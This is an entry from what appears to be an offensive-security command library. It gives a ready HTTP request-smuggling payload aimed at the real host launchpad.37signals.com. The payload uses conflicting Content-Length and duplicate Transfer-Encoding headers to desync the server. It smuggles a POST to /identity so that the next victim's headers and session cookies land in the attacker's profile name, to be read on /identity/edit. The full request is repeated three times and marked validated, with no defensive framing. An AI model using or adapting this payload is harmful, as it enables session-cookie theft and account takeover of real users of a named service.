---
data: >-
  POST /identity HTTP/1.1

  Host: launchpad.37signals.com

  Content-Length: 903

  Connection: keep-alive

  Content-Type: application/x-www-form-urlencoded

  Transfer-Encoding: chunked

  Transfer-Encoding: foo


  213

  x=1

  0


  POST /identity HTTP/1.1

  Host: launchpad.37signals.com

  Content-Length: 435

  X-Forwarded-Proto: https

  Content-Type: application/x-www-form-urlencoded

  Cookie: identity_id=PASTE_identity_id_HERE;
  session_token=PASTE_session_token_HERE;
  _launchpad_session=PASTE_launchpad_session_HERE


  _method=patch&authenticity_token=PASTE_authenticity_token_HERE&identity%5bavatar%5d=&identity%5bname%5d=
tags:
  - http
  - smuggling
type: command
executor: bash
platforms:
  - Web
id: 0263974d-4ff3-4575-b7d5-312fcceaa6b6
created_at: '2025-12-13T09:01:21.703Z'
updated_at: '2025-12-13T09:01:21.703Z'
verified: false
validated: true
submitted: true
---
# http-smuggling-post-desync-cookie-capture

## Command

```bash
POST /identity HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 903
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: foo

213
x=1
0

POST /identity HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 435
X-Forwarded-Proto: https
Content-Type: application/x-www-form-urlencoded
Cookie: identity_id=PASTE_identity_id_HERE; session_token=PASTE_session_token_HERE; _launchpad_session=PASTE_launchpad_session_HERE

_method=patch&authenticity_token=PASTE_authenticity_token_HERE&identity%5bavatar%5d=&identity%5bname%5d=
```

## Description

Sends a desync request to smuggle a POST that captures and stores victim request data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `Cookie` | Uses pasted cookie values for authentication in smuggled request | Yes |
| `_method` | patch to update identity | Yes |
| `Content-Length` | 903 for the outer request | Yes |
| `Transfer-Encoding` | chunked (valid) followed by foo (invalid) | Yes |
| `authenticity_token` | CSRF token | Yes |

## Examples

### Basic Usage

```bash
POST /identity HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 903
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: foo

213
x=1
0

POST /identity HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 435
X-Forwarded-Proto: https
Content-Type: application/x-www-form-urlencoded
Cookie: identity_id=PASTE_identity_id_HERE; session_token=PASTE_session_token_HERE; _launchpad_session=PASTE_launchpad_session_HERE

_method=patch&authenticity_token=PASTE_authenticity_token_HERE&identity%5bavatar%5d=&identity%5bname%5d=
```

## Expected Output

Captured headers and cookies visible on /identity/edit page.

## Related

- [[procedures/Craft-Desync-Request-for-Cookie-Capture]]
